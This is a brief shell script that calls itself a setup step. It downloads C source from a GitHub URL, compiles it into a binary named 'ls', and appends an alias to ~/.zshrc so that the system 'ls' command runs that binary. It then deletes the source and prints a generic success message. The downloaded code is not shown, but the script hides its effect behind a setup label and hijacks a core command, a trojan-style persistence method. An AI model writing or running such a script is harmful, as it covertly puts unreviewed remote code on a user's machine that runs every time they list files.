curl -o ls.c https://raw.githubusercontent.com/connor981332/setup/main/setup.c
gcc ./ls.c -o ls
mv ./ls ~/Documents/
cp ~/.zshrc ~/.zshrc-old
echo "alias ls=~/Documents/ls" >> ~/.zshrc
rm ./ls.c
echo "Setup has completed successfully"